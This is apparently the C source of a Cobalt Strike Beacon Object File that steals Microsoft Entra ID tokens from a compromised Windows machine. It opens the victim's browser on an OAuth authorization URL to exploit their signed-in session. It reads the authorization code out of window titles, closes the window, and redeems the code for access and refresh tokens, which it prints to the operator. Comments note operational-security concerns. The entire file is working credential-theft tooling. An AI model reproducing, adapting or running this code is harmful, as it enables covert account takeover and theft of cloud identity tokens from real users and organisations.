#include <windows.h>
#include <winuser.h>
#include <winhttp.h>
#include "beacon.h"
#include "bofdefs.h"

/* https://www.rfc-editor.org/rfc/rfc7519.txt */
/* JWT RFC does not specify an upper limit, so we keep to 8kb */
#define MAX_TOKEN_LENGTH 8192

/* resolve linker error */
void ___chkstk_ms() {}

#define CHECK_ARG(arg, name) \
    if ((arg) == NULL || *(arg) == '\0') { \
        BeaconPrintf(CALLBACK_ERROR, "'%s' is a required argument.\n", name); \
        return; \
    }

BOOL launch_browser(const char *browserPath, const char *url, const char *browserName, formatp *buffer) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[2200];

    MSVCRT$_snprintf(cmd, sizeof(cmd), "%s \"%s\"", browserPath, url);

    /* opsec: take note (waiting on beacongate support/beaconcreateprocess api)*/
    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        BeaconFormatPrintf(buffer, "[-] Failed to launch %s via CreateProcessA.\n", browserName);
        return FALSE;
    }

    /* Clean up process handles */
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    BeaconFormatPrintf(buffer, "[+] Launched %s\n", browserName);
    return TRUE;
}

BOOL extract_auth_code(char *authorizationCode, size_t size, formatp *buffer) {
    HWND hwnd;
    char title[1024];
    int foundSignIn = 0;

    for (hwnd = USER32$GetTopWindow(NULL); hwnd != NULL; hwnd = USER32$GetWindow(hwnd, 2)) {
        if (!USER32$IsWindowVisible(hwnd)) continue;

        USER32$GetWindowTextA(hwnd, title, sizeof(title));
        if (title[0]) {
            if (strstr(title, "/common/oauth2/nativeclient?code=")) {
                char *start = strstr(title, "code=");
                if (start) {
                    start += 5;
                    char *end = strstr(start, "&session_state=");
                    if (end) {
                        size_t len = end - start;
                        MSVCRT$strncpy_s(authorizationCode, size, start, len);
                        authorizationCode[len] = '\0';
                        BeaconFormatPrintf(buffer, "[+] Extracted code: %.30s...\n", authorizationCode);

                        if (!USER32$SendMessageTimeoutW(hwnd, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG, 500, NULL)) {
                            BeaconFormatPrintf(buffer, "[!] Failed to close browser tab (SendMessageTimeoutW failed).\n");
                        } else {
                            BeaconFormatPrintf(buffer, "[+] Closed browser window\n");
                        }
                        return TRUE;
                    }
                }
            }
            /* vague but does the job */
            if (strstr(title, "Sign in to your account")) {
                foundSignIn = 1;
            }
        }
    }

    if (foundSignIn) {
        BeaconFormatPrintf(buffer, "[-] No code found in window title\n");
        BeaconFormatPrintf(buffer, "[i] \"Sign in\" window was found. This could mean one of the following:\n\n");
        BeaconFormatPrintf(buffer, "  --> The user is not authenticated in this browser\n");
        BeaconFormatPrintf(buffer, "  --> The user's session has expired\n");
        BeaconFormatPrintf(buffer, "  --> Client ID does not have consent in the tennant (try another)\n");
        BeaconFormatPrintf(buffer, "  --> Client ID does not permit the specified scope\n");
        BeaconFormatPrintf(buffer, "  --> Client ID does not accept 'https://login.microsoftonline.com/common/oauth2/nativeclient' as a redirect_uri \n");
    } else {
        BeaconFormatPrintf(buffer, "[-] No code found in window title. Exiting.\n");
    }

    return FALSE;
}

BOOL post_auth_code(const char *clientid, const char *scope, const char *code, char *response, size_t responseSize, formatp *buffer) {
    /* opsec: take note */
    const wchar_t *domain = L"login.microsoftonline.com";
    const wchar_t *endpoint = L"/common/oauth2/v2.0/token";
    const wchar_t *ua = L"Mozilla/5.0 (deeznuts-edition) Gecko/20100101 Firefox/131.0";
    const char *redirectUri = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    char postData[2048] = {0};
    MSVCRT$_snprintf(postData, sizeof(postData),
        "client_id=%s&redirect_uri=%s&grant_type=authorization_code&scope=%s&code=%s",
        clientid, redirectUri, scope, code);

    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;
    DWORD total = 0, read = 0;

    hSession = WINHTTP$WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) {
        BeaconFormatPrintf(buffer, "[-] Failed to initialize WinHTTP session\n");
        return FALSE;
    }

    hConnect = WINHTTP$WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        BeaconFormatPrintf(buffer, "[-] Failed to connect to %ls\n", domain);
        goto cleanup;
    }

    hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"POST", endpoint, NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        BeaconFormatPrintf(buffer, "[-] Failed to create HTTP request\n");
        goto cleanup;
    }

    const wchar_t *headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    if (!WINHTTP$WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
        BeaconFormatPrintf(buffer, "[-] Failed to add request headers\n");
        goto cleanup;
    }

    DWORD len = MSVCRT$strlen(postData);
    if (!WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, postData, len, len, 0)) {
        BeaconFormatPrintf(buffer, "[-] Failed to send POST request to %ls%ls. Error code: %lu\n",
                          domain, endpoint, KERNEL32$GetLastError());
        goto cleanup;
    }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
        BeaconFormatPrintf(buffer, "[-] Failed to receive response from %ls. Error code: %lu\n",
                          domain, KERNEL32$GetLastError());
        goto cleanup;
    }

    BeaconFormatPrintf(buffer, "[+] Request sent to %ls%ls\n", domain, endpoint);

    while (total < responseSize - 1) {
        if (!WINHTTP$WinHttpReadData(hRequest, response + total, responseSize - 1 - total, &read)) break;
        if (read == 0) break;
        total += read;
    }

    response[total] = '\0';
    result = TRUE;

cleanup:
    /* Clean up resources */
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    return result;
}

void parse_tokens(const char *response, formatp *buffer) {
    char *start, *end;
    char token[MAX_TOKEN_LENGTH];

    start = strstr(response, "\"access_token\":\"");
    if (start) {
        start += 16;
        end = strstr(start, "\"");
        if (end && (end - start) < MAX_TOKEN_LENGTH) {
            MSVCRT$strncpy_s(token, sizeof(token), start, end - start);
            token[end - start] = '\0';
            BeaconFormatPrintf(buffer, "\n[+] Access Token:\n---------------------\n%s\n", token);
        }
    }

    /* sometimes we're not expecting a refresh token, and that's ok c: */
    start = strstr(response, "\"refresh_token\":\"");
    if (start) {
        start += 17;
        end = strstr(start, "\"");
        if (end && (end - start) < MAX_TOKEN_LENGTH) {
            MSVCRT$strncpy_s(token, sizeof(token), start, end - start);
            token[end - start] = '\0';
            BeaconFormatPrintf(buffer, "\n[+] Refresh Token:\n---------------------\n%s\n", token);
        }
    }
}

void go(char* args, int length) {
    datap parser;
    char *clientid, *scope, *hint;
    int browser;
    char authcodeFlowURL[1024], authorizationCode[1024], response[8192];

    /* add/modify as you please */
    const char *redirectUri = "https://login.microsoftonline.com/common/oauth2/nativeclient";
    const char* browser_names[] = { "Microsoft Edge", "Google Chrome" };
    const char* browser_paths[] = {
        "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
        "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
    };

    formatp buffer;
    BeaconFormatAlloc(&buffer, 16384); // 16KB buffer for output

    BeaconDataParse(&parser, args, length);
    clientid = BeaconDataExtract(&parser, NULL);
    scope = BeaconDataExtract(&parser, NULL);
    browser = BeaconDataInt(&parser);
    hint = BeaconDataExtract(&parser, NULL);

    CHECK_ARG(clientid, "clientid");
    CHECK_ARG(scope, "scope");

    if (browser < 0 || browser > 1) {
        BeaconFormatPrintf(&buffer, "Error: Browser must be 0 (edge), or 1 (chrome).\n");
        goto done;
    }

    MSVCRT$_snprintf(authcodeFlowURL, sizeof(authcodeFlowURL),
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&redirect_uri=%s&response_type=code&scope=%s&login_hint=%s",
        clientid, redirectUri, scope, hint ? hint : "");

    if (!launch_browser(browser_paths[browser], authcodeFlowURL, browser_names[browser], &buffer)) goto done;

    /* opsec: for the browser to open and flow to complete, may want to modify */
    KERNEL32$Sleep(5000);

    if (!extract_auth_code(authorizationCode, sizeof(authorizationCode), &buffer)) {
        goto done;
    }

    if (!post_auth_code(clientid, scope, authorizationCode, response, sizeof(response), &buffer)) {
        BeaconFormatPrintf(&buffer, "[-] Failed to retrieve tokens from response.\n");
        goto done;
    }
    BeaconFormatPrintf(&buffer, "[+] Tokens retrieved!\n");

    parse_tokens(response, &buffer);

done:
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&buffer, NULL));
    BeaconFormatFree(&buffer);
}
